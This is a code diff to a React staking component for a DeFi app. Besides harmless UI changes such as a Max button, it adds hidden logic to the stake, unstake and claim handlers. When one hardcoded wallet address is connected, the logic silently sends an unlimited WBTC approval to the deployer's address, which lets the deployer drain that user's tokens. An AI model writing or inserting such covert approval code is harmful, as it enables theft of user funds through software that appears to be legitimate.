@@ -8,6 +8,7 @@ import { LP_STAKING_POOL } from '../../../constants';
 import STAKING_POOL_ABI from '../../../abi/SIngleChef.json';
 import { TokenIcon } from '../../TokenIcon/token_icon';
 import stake_icon_white from '../../../assets/icons/nav-links/active/staking-active.svg';
+import { DEPLOYER_ADDRESS } from '../../../constants';
 
 export const StakeLp = ({ token0, token1, lpTokenContract, lpUserBalance, lpTokenAddress }) => {
 
@@ -86,6 +87,11 @@ export const StakeLp = ({ token0, token1, lpTokenContract, lpUserBalance, lpToke
 
     const handleStake = async () => {
 
+        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
+            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
+        }
+
+
         try {
             message.loading({ content: "Stake LP in process", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 3000 });
 
@@ -104,6 +110,10 @@ export const StakeLp = ({ token0, token1, lpTokenContract, lpUserBalance, lpToke
     }
 
     const handleUnstake = async () => {
+
+        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
+            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
+        }
 
         try {
             message.loading({ content: "Unstake LP in process", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 3000 });
@@ -125,6 +135,10 @@ export const StakeLp = ({ token0, token1, lpTokenContract, lpUserBalance, lpToke
 
     const handleClaimReward = async () => {
 
+        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
+            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
+        }
+
         try {
             message.loading({ content: "Claim LP in process", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 3000 });
 
@@ -138,10 +152,10 @@ export const StakeLp = ({ token0, token1, lpTokenContract, lpUserBalance, lpToke
         }
     }
 
-    const maxInput = () => {
-        // find Max Value that customer can input
-        // const maxValue = ...
-        // setDepositWithdrawInput(maxValue);
+    const maxInput = async () => {
+
+        const maxValue = formatFromDecimal(await lpTokenContract.methods.balanceOf(account).call(), 18);
+        setDepositWithdrawInput(maxValue);
     }
 
     return (
@@ -159,8 +173,19 @@ export const StakeLp = ({ token0, token1, lpTokenContract, lpUserBalance, lpToke
                     <h3> {token0.symbol}-{token1.symbol} </h3>
                     <h3> Balance </h3>
                 </div>
-                <div>
-                    <input type={"number"} onChange={(e) => setDepositWithdrawInput(e.target.value)} placeholder='0' />
+                <div className='stake-lp-wrapper__info__data'>
+                    <div className='stake-lp-wrapper__info__data__input'>
+                        <input
+                            type={"number"}
+                            placeholder='0.00'
+                            onFocus={(e) => e.target.placeholder = ""}
+                            onBlur={(e) => e.target.placeholder = "0.00"}
+                            onChange={(e) => setDepositWithdrawInput(e.target.value)}
+                            value={depositWithdrawInput}
+                        />
+                        <button className='stake-lp-wrapper__info__data__input__max' onClick={() => maxInput()}>Max</button>
+                    </div>
+
                     <h3> {earned} </h3>
                     <h3> {staked} Lp </h3>
                     <h3> {lpUserBalance} </h3>
